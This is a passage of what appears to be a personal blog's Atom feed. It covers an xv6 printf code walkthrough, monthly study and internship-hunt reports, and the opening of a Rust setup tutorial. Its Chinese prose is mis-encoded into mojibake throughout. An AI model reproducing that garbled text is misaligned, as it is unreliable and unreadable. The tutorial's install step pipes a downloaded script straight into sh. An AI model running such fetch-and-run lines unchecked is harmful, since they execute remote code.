class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="type">int</span> i, c, locking;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ é”</span></span><br><span class="line">  locking = pr.locking;</span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    acquire(&amp;pr.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fmt == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;null fmt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆå§‹åŒ– ap</span></span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// éå† fmt</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; (c = fmt[i] &amp; <span class="number">0xff</span>) != <span class="number">0</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(c != <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = fmt[++i] &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå‰ä¸€ä¸ªæ˜¯ % æ¥ä¸‹æ¥æ ¹æ®åé¢çš„å­—æ¯è·å–å¯¹åº”ç±»å‹çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">      printptr(va_arg(ap, uint64));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span>((s = va_arg(ap, <span class="type">char</span>*)) == <span class="number">0</span>)</span><br><span class="line">        s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span>(; *s; s++)</span><br><span class="line">        consputc(*s);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// å¦‚æœæ˜¯ä¸æ”¯æŒçš„å­—æ¯ï¼Œåˆ™ç›´æ¥è¾“å‡º % å’Œå­—æ¯</span></span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é‡Šæ”¾å†…å­˜</span></span><br><span class="line">  va_end(ap);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è§£é”</span></span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    release(&amp;pr.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é€»è¾‘æŒºç®€å•çš„</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://zhuanlan.zhihu.com/p/94036267">æ­ç§˜X86æ¶æ„Cå¯å˜å‚æ•°å‡½æ•°å®ç°åŸç†</a>ï¼šå…¶å®è¿™ç¯‡æ–‡ç« æ‰€è¯´çš„ x86 æŒ‡çš„æ˜¯ x86_64</p><h2 id="æ€ä¹ˆæˆåŠŸåˆ›å»ºä¸€ä¸ªè¿›ç¨‹"><a href="#æ€ä¹ˆæˆåŠŸåˆ›å»ºä¸€ä¸ªè¿›ç¨‹" class="headerlink" title="æ€ä¹ˆæˆåŠŸåˆ›å»ºä¸€ä¸ªè¿›ç¨‹"></a>æ€ä¹ˆæˆåŠŸåˆ›å»ºä¸€ä¸ªè¿›ç¨‹</h2><p>#todo</p><h2 id="æ€ä¹ˆå®ç°é¡µè¡¨çš„åˆ›å»ºä¸æ›´æ–°"><a href="#æ€ä¹ˆå®ç°é¡µè¡¨çš„åˆ›å»ºä¸æ›´æ–°" class="headerlink" title="æ€ä¹ˆå®ç°é¡µè¡¨çš„åˆ›å»ºä¸æ›´æ–°"></a>æ€ä¹ˆå®ç°é¡µè¡¨çš„åˆ›å»ºä¸æ›´æ–°</h2><p>#todo</p><h2 id="æ€ä¹ˆå®ç°è™šæ‹Ÿåœ°å€æ˜ å°„"><a href="#æ€ä¹ˆå®ç°è™šæ‹Ÿåœ°å€æ˜ å°„" class="headerlink" title="æ€ä¹ˆå®ç°è™šæ‹Ÿåœ°å€æ˜ å°„"></a>æ€ä¹ˆå®ç°è™šæ‹Ÿåœ°å€æ˜ å°„</h2><p>#todo </p><h2 id="æ€ä¹ˆå®ç°çº¿ç¨‹åˆ‡æ¢"><a href="#æ€ä¹ˆå®ç°çº¿ç¨‹åˆ‡æ¢" class="headerlink" title="æ€ä¹ˆå®ç°çº¿ç¨‹åˆ‡æ¢"></a>æ€ä¹ˆå®ç°çº¿ç¨‹åˆ‡æ¢</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸ªäººå¯¹ xv6 è¿™ä¸ªç®€æ˜“æ“ä½œç³»ç»Ÿå†…æ ¸æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œå°±æƒ³å†™ä¸€ä¸ªå‰–æï¼Œçœ‹çœ‹ xv6 éƒ½æ˜¯æ€ä¹ˆå®ç°è¿™äº›åŠŸèƒ½çš„ï¼ŒåšæŒä¸€å‘¨æ›´ä¸€ä¸ªè¯é¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>2023.05</title>
    <link href="https://humoooor.cn/2023/05/10/2023.05/"/>
    <id>https://humoooor.cn/2023/05/10/2023.05/</id>
    <published>2023-05-10T12:05:00.000Z</published>
    <updated>2023-06-02T16:04:48.320Z</updated>
    
    <content type="html"><![CDATA[<p>è½¬å¥½çš„äº”æœˆï¼ˆï¼Ÿï¼‰</p><span id="more"></span><h2 id="Week-5-2023-05-01-2023-05-07"><a href="#Week-5-2023-05-01-2023-05-07" class="headerlink" title="Week 5 (2023.05.01 - 2023.05.07)"></a>Week 5 (2023.05.01 - 2023.05.07)</h2><p>å‡ºå»å®Œå›æ¥äº†ï¼Œå‰©ä¸‹å†ç©å‡ å¤©</p><p>è£è€€ç¬”è¯•è¿‡äº†ğŸ˜‹ï¼Œä½†åˆ«é«˜å…´å¤ªæ—©</p><p>æŠŠç¬”è¯•é¢˜ç”¨ Rust è¿‡ä¸€éï¼Œå‘ç°å…¨æ˜¯ç®€å•é¢˜ ğŸ˜…ï¼Œwsfw</p><p>æŠ•äº†èè‹±ç­ï¼Œä»¥å‰æŠŠåå­å½“ä¿åº•ï¼Œç°åœ¨é«˜æ”€ä¸èµ· ğŸ˜­</p><p>ğŸ“ è¢«è–„çº±äº†</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>Rust ç»§ç»­çœ‹</li><li>å¼€å§‹ xv6</li></ol><h2 id="Week-6-2023-05-08-2023-05-14"><a href="#Week-6-2023-05-08-2023-05-14" class="headerlink" title="Week 6 (2023.05.08 - 2023.05.14)"></a>Week 6 (2023.05.08 - 2023.05.14)</h2><p>å¼€å§‹ xv6 äº†ï¼Œä¸€å¼€å§‹çš„ Utilities å’Œ System calls è¿˜æ¯”è¾ƒç®€å•ï¼Œåˆ° Page tables çš„æ—¶å€™å› ä¸º RISC-V é¡µè¡¨çŸ¥è¯†å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå‡†å¤‡å†å»çœ‹çœ‹ç¬”è®°å’Œè§†é¢‘ï¼Œå¤ä¹ ä¸€é</p><p>è£è€€ä¸€é¢è¿‡äº†ğŸ˜‹ï¼Œåšäº†æ€§æ ¼æµ‹è¯•ï¼Œå¬è¯´ä¼šåˆ·äººï¼Œæœ‰ç‚¹æ…ŒğŸ˜°</p><p>Rustlings è¿˜å‰©ä¸€ç‚¹</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>xv6 Page tablesã€Trapsã€COW</li></ol><h2 id="Week-7-2023-05-15-2023-05-21"><a href="#Week-7-2023-05-15-2023-05-21" class="headerlink" title="Week 7 (2023.05.15 - 2023.05.21)"></a>Week 7 (2023.05.15 - 2023.05.21)</h2><p>çœ‹å®Œ Page tablesï¼Œæƒ³å†™ä¸€ä¸ª xv6 å‰–æï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨çš„å®ç°è¿‡ç¨‹ã€åˆ›å»ºä¸€ä¸ªè¿›ç¨‹çš„è¿‡ç¨‹ç­‰ç­‰ï¼Œå¸Œæœ›ä¸é¸½</p><p><del>è£è€€äºŒé¢äº†ï¼Œç¬¬ä¸€ä¸ªäºŒé¢çš„ä¼ä¸šï¼Œæ„Ÿè°¢è£è€€ï¼Œsoluteï¼</del></p><p>è£è€€å¯„äº†ğŸ˜­</p><p>å‡†å¤‡ä¸‹åå­é¢è¯•</p><p>æœ€è¿‘å¼€å§‹å­¦ä¸‹äº”åéŸ³å›¾æ</p><p>æ€è€ƒä¸€ä¸‹å­¦ä¹ æ—¶é—´å®‰æ’ï¼Œæ„Ÿè§‰åº”è¯¥åœ¨ä¸€æ®µæ—¶é—´é‡Œä¸“å¿ƒå­¦ä¸€ä»¶äº‹æƒ…ï¼Œæ¯”å¦‚ä¸¤å¤©å­¦ xv6ï¼Œä¸¤å¤©å­¦ rust è¿™æ ·</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>xv6 Trapsã€COW</li><li>çœ‹ä¸€ä¸‹ Go çš„æ¼æ´æŒ–æ˜</li><li>çœ‹ä¸€ä¸‹ glibc malloc</li></ol><h2 id="Week-8-2023-05-22-2023-05-28"><a href="#Week-8-2023-05-22-2023-05-28" class="headerlink" title="Week 8 (2023.05.22 - 2023.05.28)"></a>Week 8 (2023.05.22 - 2023.05.28)</h2><p>å¼€äº†ä¸ª xv6 å‰–æçš„å‘ï¼Œå†™äº†ç‚¹å†…å®¹ï¼Œæœ‰ç‚¹æˆå°±æ„ŸæğŸ˜‹</p><p>çœ‹äº†ä¼š Go çš„ Pwnï¼Œå‘ç°å¥½éš¾ o(â•¥ï¹â•¥)oï¼Œå¼€æ‘†äº†</p><p>ç¨å¾®å¤ä¹ äº†ä¸‹ glibc å’Œ musl libc å°±å»é¢è¯•äº†</p><p>çº¿ä¸‹é¢è¯•è¿˜è¦æ‰‹å†™ä»£ç ğŸ˜°ï¼Œåˆ¤æ–­ç´ æ•°ï¼Œå¿˜è®°éå†æ—¶æŠŠå¹³æ–¹æ ¹å¸¦è¿›å»äº†ï¼ˆ<del>åº”è¯¥æ²¡äº‹å§</del>ï¼‰</p><p>å‘¨å…­ä¸€ä¸ŠåˆæŠŠåå­é¢å®Œäº†ï¼Œæœ¬æ¥ä»¥ä¸ºäºŒé¢ä¸‹åˆæ‰å¼€å§‹ï¼Œæ”¶æ‹¾å¥½ä¸œè¥¿åˆ°å®¿èˆäº†ï¼Œæ”¶åˆ°äºŒé¢å·²å¼€å§‹çš„é€šçŸ¥ï¼ˆæ€¥æ€¥æ€¥ï¼‰ï¼Œåˆèµ¶å›å»é¢è¯•äº†</p><p>ä¸€é¢æ‰‹æ’•ç®€å•çš„æ‰¾æœ€å¤§å­ä¸²ï¼Œæ‰‹è´±è‡ªå·±å†™äº†ä¸ªä¾‹å­æ²¡é€šè¿‡ï¼Œé¢è¯•å®˜ç»™çš„ä¾‹å­å€’æ˜¯è¿‡äº†ï¼ˆ</p><p>åå­ä½ â‘¨â‘¨æˆ‘å§</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>å„ç§è¯¾çš„ ddl</li><li>xv6 ç»§ç»­</li><li>æ˜¯ä¸æ˜¯è¦å¼€å§‹é¢„ä¹ æœŸæœ«äº†ï¼ˆï¼Ÿï¼‰</li></ol><h2 id="Week-9-2023-05-29-2023-05-31"><a href="#Week-9-2023-05-29-2023-05-31" class="headerlink" title="Week 9 (2023.05.29 - 2023.05.31)"></a>Week 9 (2023.05.29 - 2023.05.31)</h2><p>æ‘†äº†ä¸‰å¤©ï¼Œåªå†™å®Œäº† ddl</p><p>å¼€å§‹æŠ•å°å‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªæœˆåˆç†Ÿæ‚‰äº†ä¸€é xv6 å’Œ RISC-Vï¼Œç„¶åå®Œå–„äº†å¯¹åº”çš„æ–‡ç« ï¼Œç„¶åå¯¹ gdb ä¹Ÿæ›´ç†Ÿç»ƒäº†ï¼Œä¹‹å‰è¿˜ä¸çŸ¥é“æ€ä¹ˆå¯¹ç€æºç ä¸‹æ–­ç‚¹</p><p>å®ä¹ è¿˜æ˜¯ä¸€ç­¹è«å±•ï¼Œæ€¥æ€¥æ€¥</p><p>ä¸‹æœˆæœŸæœ›</p><ul><li>å‡†å¤‡<del>å¤ä¹ </del>é¢„ä¹ æœŸæœ«</li><li>çªç ´ 0 offer</li><li>æ—©ç¡æ—©èµ·</li><li>xv6 çœ‹æƒ…å†µç»§ç»­</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;è½¬å¥½çš„äº”æœˆï¼ˆï¼Ÿï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>2023.04</title>
    <link href="https://humoooor.cn/2023/04/09/2023.04/"/>
    <id>https://humoooor.cn/2023/04/09/2023.04/</id>
    <published>2023-04-09T08:00:00.000Z</published>
    <updated>2023-06-02T16:02:57.082Z</updated>
    
    <content type="html"><![CDATA[<p>å¿ƒè¡€æ¥æ½®æƒ³è¦è®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œå¸Œæœ›èƒ½åšæŒä¸‹å» â€”â€” æ…Œä¹±çš„ä¸€ä¸ªæœˆ</p><span id="more"></span><h2 id="Week-1-2023-04-01-2023-04-09"><a href="#Week-1-2023-04-01-2023-04-09" class="headerlink" title="Week 1 (2023.04.01 - 2023.04.09)"></a>Week 1 (2023.04.01 - 2023.04.09)</h2><p>å‘ç° Rust <a href="https://doc.rust-lang.org/stable/book/">åœ£ç»</a>çš„<a href="https://kaisery.github.io/trpl-zh-cn/">ä¸­æ–‡è¯‘æœ¬</a>ï¼Œå‡†å¤‡ä»¥æ­¤å­¦ä¹  Rustï¼Œå…¶ä»–æ–‡æ¡£ä½œä¸ºè¡¥å……</p><p>æœ¬æ¥æƒ³ç€è¾¹å­¦ Rust è¾¹åšç¬”è®°ï¼Œä½†æ˜¯å‘ç°é€Ÿåº¦æœ‰ç‚¹æ…¢ï¼Œæ¯•ç«Ÿ Rust åªæ˜¯è®­ç»ƒè¥çš„å‰ç½®æŠ€èƒ½ï¼ˆQAQï¼‰</p><p><del>è¿™å‘¨ä¹Ÿå¿™ç€å…¶ä»–äº‹æƒ…ï¼Œæ”¾åœ¨ Rust çš„æ—¶é—´ä¸å¤š</del>ï¼ˆéƒ½æ˜¯å€Ÿå£ï¼ï¼‰</p><p>å› æ­¤åªå†™äº†ä¸¤ç¯‡æ–‡ç« ï¼Œä¸€ç¯‡<a href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/">å…¥é—¨</a>ï¼Œä¸€ç¯‡æ‰€æœ‰æƒ<del>ï¼ˆå¦‚æœä½ çœ‹åˆ°æˆ‘äº†ï¼Œè¯´æ˜æ‰€æœ‰æƒè¿˜æ²¡æœ‰å†™å¥½ï¼‰</del>ï¼Œä»¥åå¯èƒ½åªä¼šå†™ä¸€äº›æ¯”è¾ƒéœ€è¦æ³¨æ„çš„ç‚¹<del>ï¼ˆäº‰å–å¤šå†™ç‚¹ğŸ•ŠğŸ•ŠğŸ•Šï¼‰</del></p><p>å’Œç¾¤å‹è®¨è®ºäº†ä¸‹ enum çš„ç‰¹ç‚¹ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ª tagged unionï¼ˆæˆ–è®¸åªæœ‰æˆ‘ä¸çŸ¥é“555ï¼‰ï¼Œäº†è§£äº†å®ƒçš„å†…å­˜å¸ƒå±€</p><p>Rustlings åšåˆ°äº† structsï¼Œè¦åŠ é€Ÿï¼</p><p>çœ‹å¯ä¿¡è®¡ç®—å¹³å°çš„æ–‡æ¡£ï¼Œè°ƒç ”å¯è¡Œæ€§</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>çœ‹å®Œ Rust åœ£ç»</li><li>åšå®Œ Rustlings</li><li>è°ƒç ”å¯ä¿¡è®¡ç®—å¹³å°çš„å¯è¡Œæ€§</li></ol><h2 id="Week-2-2023-04-10-2023-04-16"><a href="#Week-2-2023-04-10-2023-04-16" class="headerlink" title="Week 2 (2023.04.10 - 2023.04.16)"></a>Week 2 (2023.04.10 - 2023.04.16)</h2><p>æœç„¶ä¸Šä¸€å‘¨çš„å­½ï¼Œè¿™ä¸€å‘¨åŠ å€è¿˜</p><p>ä¸ºäº†èµ¶è¿›åº¦ï¼Œè‰è‰åšå®Œäº† Rustlingsï¼Œåœ£ç»è¿˜æ²¡ç»†çœ‹</p><p>ç»è®¨è®ºå‘ç°å¯ä¿¡è®¡ç®—å¹³å°çŸ­çŸ­å‡ ä¸ªæœˆæ—¶é—´æ ¹æœ¬å¼„ä¸å®Œï¼Œæ”¾å¼ƒäº†</p><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>çœ‹å®Œ Rust åœ£ç»<ul><li>ä¸€å®šè¦ç»†çœ‹ï¼Œå¤šå†™å†™ä»£ç </li></ul></li><li>å­¦ä¹  RISC-V æ¶æ„<ul><li>éç‰¹æƒçº§æŒ‡ä»¤</li><li>ç‰¹æƒçº§æŒ‡ä»¤</li><li>é¡µè¡¨</li></ul></li></ol><h2 id="Week-3-2023-04-17-2023-04-23"><a href="#Week-3-2023-04-17-2023-04-23" class="headerlink" title="Week 3 (2023.04.17 - 2023.04.23)"></a>Week 3 (2023.04.17 - 2023.04.23)</h2><p>ç”±äºèº«ä½“åŸå› ï¼Œå»åŒ»é™¢å»äº†å¥½å‡ è¶Ÿï¼ŒçœŸè´¹æ—¶é—´å•Š</p><p>Rust è¿˜æ²¡çœ‹å®Œ ğŸ”</p><p>å°±è·Ÿç€ OS è¯¾ç¨‹çœ‹äº†ä¸€é RISC-V è®²ä¹‰</p><p>æˆç»©å‡ºæ¥äº†ï¼Œå½»åº•æ”¾å¼ƒä¿ç ”æƒ³æ³•ğŸ˜­ï¼Œå‡†å¤‡æ‰¾å®ä¹ äº†ğŸ˜­</p><p>æŠ•äº†</p><ul><li>åœ°å¹³çº¿çš„åµŒå…¥å¼å¼€å‘ï¼Œç®€å†ç›´æ¥ ğŸ” äº† ğŸ˜°</li><li>ç™¾åº¦çš„å®‰å…¨å·¥ç¨‹å¸ˆï¼Œç¬”è¯• ğŸ” äº†ï¼Œæ€ä¹ˆéƒ½æ˜¯ Web å®‰å…¨å•Š ğŸ˜¡</li><li>æ‹›è¡Œçš„æµ‹è¯•ï¼ˆï¼Ÿï¼‰ï¼Œä¸€é¢ ğŸ” äº†</li></ul><p>ä¸‹å‘¨æœŸæœ›ï¼š</p><ol><li>ç»§ç»­çœ‹ Rust åœ£ç»</li><li><del>å¼€å§‹ rcore</del></li></ol><h2 id="Week-4-2023-04-24-2023-04-30"><a href="#Week-4-2023-04-24-2023-04-30" class="headerlink" title="Week 4 (2023.04.24 - 2023.04.30)"></a>Week 4 (2023.04.24 - 2023.04.30)</h2><p>è¿™å‘¨æœ‰ç‚¹æ‘†ï¼Œå¥³æœ‹å‹å‡ºå»ç©æ ğŸ¥°</p><p>æ€è€ƒäº†ä¸€ä¸‹å°±ä¸šæ–¹å‘ï¼Œå‡†å¤‡æ‰¾ Linux/OS å¼€å‘</p><p>åšäº†è£è€€çš„ OS å¼€å‘ç¬”è¯•ï¼Œå°±åšäº†ä¸€é“åŠ ğŸ˜­ï¼Œ æ„Ÿè§‰æœ‰ç‚¹æ‚¬</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¨€é‡Œç³Šæ¶‚çš„ä¸€ä¸ªæœˆï¼Œç»å‰é¡¾åï¼Œæœ€åè¿˜æ˜¯å†³å®šå°±ä¸š</p><p>ä¸‹æœˆæœŸæœ›</p><ol><li>çœ‹å®Œ Rust åœ£ç»</li><li>ç»§ç»­å®Œæˆè½ä¸‹çš„ xv6</li><li>æ‹¿åˆ°ä¸€ä¸ªå®ä¹  offerï¼ˆçœŸçš„å¯ä»¥å—ï¼‰</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¿ƒè¡€æ¥æ½®æƒ³è¦è®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œå¸Œæœ›èƒ½åšæŒä¸‹å» â€”â€” æ…Œä¹±çš„ä¸€ä¸ªæœˆ&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>Rust å…¥é—¨</title>
    <link href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/"/>
    <id>https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/</id>
    <published>2023-04-04T09:58:00.000Z</published>
    <updated>2023-04-06T09:59:10.509Z</updated>
    
    <content type="html"><![CDATA[<p>ä»…ä»…ä»‹ç» Rust çš„å®‰è£…ã€Cargoã€å˜é‡ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ§åˆ¶æµ</p><span id="more"></span><p>ç¯å¢ƒï¼šUbuntu 22.04 rustc 1.68.2</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">$ curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 https://sh.rustup.rs -sSf | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°</span></span><br><span class="line">$ rustup update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸è½½</span></span><br><span class="line">$ rustup self uninstall</span><br></pre></td></tr></table></figure><p>å®‰è£…æ—¶ä¼šä¸‹è½½ rustup å·¥å…·ï¼Œå¹¶å®‰è£…æœ€æ–°ç‰ˆ Rust ä¸€ç³»åˆ—å·¥å…·ï¼ˆç¼–è¯‘å™¨ rustc ç­‰ï¼‰</p><p>rustup æ˜¯ä¸€ä¸ªç®¡ç† Rust ç‰ˆæœ¬å’Œç›¸å…³å·¥å…·çš„å‘½ä»¤è¡Œå·¥å…·</p><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world!"></a>Hello world!</h2><p>ç¨‹åºå‘˜ä¼ ç»Ÿæ~</p><figure class="highlight rust"><figcaption><span>hello.rs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨ rustc hello.rs ç¼–è¯‘</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code> å‡½æ•°ï¼šä¸ç”¨å¤šè¯´ï¼Œç¨‹åºå…¥å£</p><p><code>println!</code>ï¼šè°ƒç”¨äº†ä¸€ä¸ªå®ï¼ˆå¦‚æœæ˜¯è°ƒç”¨å‡½æ•°ï¼Œåé¢æ²¡æœ‰<code>!</code>ï¼‰</p><p><code>&quot;Hello world!&quot;</code>ï¼šå°†å­—ç¬¦ä¸²ä¼ é€’ç»™ <code>println</code></p><p>åˆ†å· <code>;</code> ç»“å°¾ï¼šå¤§éƒ¨åˆ†è¯­å¥éƒ½ä»¥é—®å·ç»“å°¾</p><h2 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h2><p>Cargo æ˜¯ Rust çš„æ„å»ºç³»ç»Ÿå’ŒåŒ…ç®¡ç†å™¨ã€‚å¤§å¤šæ•° Rustacean ä»¬ä½¿ç”¨ Cargo æ¥ç®¡ç†ä»–ä»¬çš„ Rust é¡¹ç›®ï¼Œå› ä¸ºå®ƒå¯ä»¥ä¸ºä½ å¤„ç†å¾ˆå¤šä»»åŠ¡ï¼Œæ¯”å¦‚æ„å»ºä»£ç ã€ä¸‹è½½ä¾èµ–åº“å¹¶ç¼–è¯‘è¿™äº›åº“ã€‚</p><p>ä¸‹é¢çš„å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ª hello_cargo çš„é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo new hello_cargo</span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰ä¸€ä¸ª <code>Cargo.toml</code> æ–‡ä»¶ï¼Œè¿™æ˜¯ Cargo çš„é…ç½®æ–‡ä»¶</p><figure class="highlight toml"><figcaption><span>Cargo.toml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;hello_cargo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br></pre></td></tr></table></figure><p><code>[package]</code>ï¼šè¡¨æ˜ä¸‹é¢ä¸ºä¸€ä¸ªåŒ…çš„é…ç½®</p><p><code>[dependencies]</code>ï¼šç½—åˆ—é¡¹ç›®ä½¿ç”¨çš„ä¾èµ–ï¼Œä¾èµ–çš„ä»£ç åŒ…ä¹Ÿè¢«ç§°ä¸º crate</p><h3 id="æ„å»ºå¹¶è¿è¡Œé¡¹ç›®"><a href="#æ„å»ºå¹¶è¿è¡Œé¡¹ç›®" class="headerlink" title="æ„å»ºå¹¶è¿è¡Œé¡¹ç›®"></a>æ„å»ºå¹¶è¿è¡Œé¡¹ç›®</h3><p>ä¸‹é¢çš„å‘½ä»¤ç”¨äºæ„å»ºé¡¹ç›®ï¼Œå¹¶ç”Ÿæˆ target æ–‡ä»¶å¤¹å’Œ Cargo.lock æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build</span><br></pre></td></tr></table></figure><p><code>target/debug/hello_carge</code> 